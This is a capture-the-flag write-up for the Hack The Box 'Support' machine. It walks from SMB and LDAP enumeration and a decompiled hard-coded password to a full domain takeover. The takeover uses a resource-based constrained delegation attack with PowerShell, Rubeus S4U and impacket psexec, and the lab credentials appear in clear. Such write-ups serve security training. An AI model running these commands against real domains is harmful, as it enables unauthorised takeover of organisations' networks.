# [Support](https://app.hackthebox.com/machines/Support)

```bash
nmap -p- --min-rate 10000 10.10.11.174 -Pn    
```

![Alt text](img/image.png)

After finding open ports, let's do greater nmap scan for these ports.

```bash
nmap -A -sC -sV -p53,135,139,445,464 10.10.11.174 -Pn 
```

![Alt text](img/image-2.png)


I can also see `UDP` port, let's look at this.

![Alt text](img/image-1.png)


After running `crackmapexec` against our target, I see that `support.htb` is domain name, let's add this into `/etc/hosts` file for resolving purposes.
```bash
crackmapexec smb 10.10.11.174
```

![Alt text](img/image-3.png)


We also know that this is `Domain Controller`.

I looked at shares by adding `--shares` option.

![Alt text](img/image-4.png)


Let's access into `supports-tools` share via `smbclient`.
```bash
smbclient //10.10.11.174/support-tools -N 
```

![Alt text](img/image-5.png)


I got `UserInfo.exe` from and look at `dnspy` tool to see logic of this executable.

I get method of encryption.

![Alt text](img/image-6.png)


I also get encrypted password on source code of this application as `hard-coded`.

![Alt text](img/image-7.png)

I found decryption way of this and got password already.

![Alt text](img/image-8.png)

That's credentials of `ldap` user.

ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz


Let's verify this credentials via `crackmapexec`.
```bash
crackmapexec smb 10.10.11.174 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

![Alt text](img/image-9.png)


As I have Domain credentials, I can dump all related info about `LDAP`, that's why I will use `ldapdomaindump` tool.

```bash
ldapdomaindump -u support.htb\\ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' support.htb -o ldap
```

![Alt text](img/image-10.png)


By reading `domain_users.json` file, I see that one `info` from `support` user that has clear-text credentials.


![Alt text](img/image-11.png)


support: Ironside47pleasure40Watchful

Let's check this credentials via `crackmapexec`.
```bash
crackmapexec smb 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'
```

![Alt text](img/image-12.png)


Let's login into machine via `evil-winrm` by grabbed credentials.
```bash
evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'
```

user.txt

![Alt text](img/image-13.png)

Let's run `bloodhound-python` via this credentials to get all information about domain.
```bash
bloodhound-python -d support.htb -u support -p Ironside47pleasure40Watchful -gc support.htb -c all -ns 10.10.11.174
```

![Alt text](img/image-14.png)


Let's run our `bloodhound` to enumerate this data.

![Alt text](img/image-15.png)


While I run `net user support` , I see that this user belongs to `Shared Account Operators` group.

![Alt text](img/image-16.png)


From `bloodhound` enumeration, I see that this `Shared Account Operators` group has `GenericAll` privilege to `Domain Controller`.

![Alt text](img/image-17.png)


As a result, we know that we have `full rights` to `dc.support.htb` object.

```bash
New-MachineAccount -MachineAccount dr4ksFakeComputer -Password $(ConvertTo-SecureString 'dr4ksdr4ks123' -AsPlainText -Force)
```

```bash
$fakesid = Get-DomainComputer dr4ksFakeComputer | select -expand objectsid
$fakesid
```

```bash
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Verification is below one.

```bash
$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor.DiscretionaryAcl
```


Final result:

![Alt text](img/image-18.png)


Let's upload `Rubeus.exe` to get Kerberos ticket.

1.First, we need to get `rc4_hmac` hash via below command.
```bash
.\Rubeus.exe hash /password:dr4ksdr4ks123 /user:dr4ksFakeComputer /domain:support.htb
```

![Alt text](img/image-19.png)

2.Let's do `S4u` for `Rubeus.exe`.
```bash
.\Rubeus.exe s4u /user:dr4ksFakeComputer$ /rc4:818B23D113D0CE761B84B0DFAFA38DAE /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
```

![Alt text](img/image-20.png)


Let's save this on our local machine.

![Alt text](img/image-21.png)

Let's convert this into `.ccache` format from `.kirbi`.

```bash
python3 /usr/share/doc/python3-impacket/examples/ticketConverter.py ticket.kirbi ticket.ccache
```

![Alt text](img/image-22.png)


Let's use this ticket for authentication to system as `Administrator` user.
```bash
KRB5CCNAME=ticket.ccache python3 /usr/share/doc/python3-impacket/examples/psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```

root.txt

![Alt text](img/image-23.png)